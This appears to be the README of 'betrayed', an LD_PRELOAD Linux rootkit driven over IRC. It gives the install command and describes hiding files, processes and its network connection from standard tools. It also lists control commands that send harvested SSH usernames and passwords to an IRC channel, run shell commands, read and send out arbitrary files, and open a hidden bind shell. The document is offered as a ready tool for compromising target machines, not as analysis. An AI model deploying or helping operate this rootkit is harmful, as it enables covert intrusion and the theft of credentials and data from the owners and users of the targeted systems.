# betrayed
### Basic info
betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
It is free of any dependencies, and installs near enough instantly.  
Files and processes are hidden with a magic GID, and the connection to the IRC server is hidden from plain sight. Tools like `netstat` and `ss` will not show betrayed's socket connection.  
Upon setup, betrayed will begin to fork from newly spawned processes, of course only if there is no other instance of the main process.  
betrayed's code is a very heavily modified and (de)restructured version of bedevil.
#### Usage
`./install.sh irc.host "#channel"` will install betrayed.  
Upon completing installation, install.sh will `cat /dev/null`, which will cause betrayed to execute its initial fork process. Even without doing `cat /dev/null` at the end of the installation, any newly spawned process will initiate the connection to the IRC server.  
<b>Compile only:</b> `COMPILE_ONLY=1 ./install.sh ...` will compile betrayed.so in your cwd.  
When installing, `install.sh` will write `config.h`. After this header is present, simply running `./install.sh` will cause the script to read settings from the header. A new nick and magic GID will be generated.
  
Once installed, and assuming you are in your target channel, you will see a new user with a random nick join your channel. That is essentially the box that you installed betrayed on.
#### Available commands
 * `!ssh_logs [nick]` (reads outgoing SSH logs, sends usernames and passwords to your desired IRC channel)
 * `!sh [nick] [command]` (executes commands on chosen server, and sends command output to the channel)
 * `!read_file [nick] [path]` (sends contents of path to IRC channel)
 * `!bind [nick] [port]` (creates a hidden /bin/sh bind shell on given port which you can connect to)
 * `!kill [nick]/all` (kills chosen iteration of betrayed. removes all respective rootkit files and disconnects)

#### Notes
##### Hiding
 * betrayed hides itself from /proc/\*/maps, smaps, and numa_maps.
 * betrayed hides itself from `ldd`, among others.
 * All betrayed-related processes are hidden.
 * No default systemd logs are created when utilising betrayed.
 * Although `ss` and `netstat` won't show the kit's socket, wireshark or anything else like it will.
##### Misc
 * betrayed's rootkit library is 20k smaller than bedevil's.